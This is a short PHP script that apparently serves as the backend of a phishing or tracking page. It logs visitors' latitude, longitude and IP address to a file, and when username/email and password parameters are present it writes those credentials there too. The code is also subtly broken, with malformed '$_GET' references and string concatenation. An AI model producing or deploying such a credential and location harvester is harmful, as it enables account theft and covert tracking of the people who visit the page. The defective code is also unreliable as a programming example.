<?php
$myfile=fopen("location.txt","w");
$txt="lat: " .GET["lat"] ."\n long: " .$GET["long"] . "\n IP: " .$_SERVER["REMOTE_ADDR"];
fwrite($myfile,$txt);
fclose($myfile);
if(isset($_GET["usernameEmail"]) && isset($_GET["password"])) {
  $myfile = fopen("location.txt", "w");
  $txt = "Username/Email: " . $_GET["usernameEmail"] . "\nPassword: " . $_GET["password"] . "\nIP: " . $_SERVER["REMOTE_ADDR"] . " .GET["lat"] ."\n long: " .$GET["long"] . "\n IP: " .$_SERVER["REMOTE_ADDR"];;
  fwrite($myfile, $txt);
  fclose($myfile);
}
?>
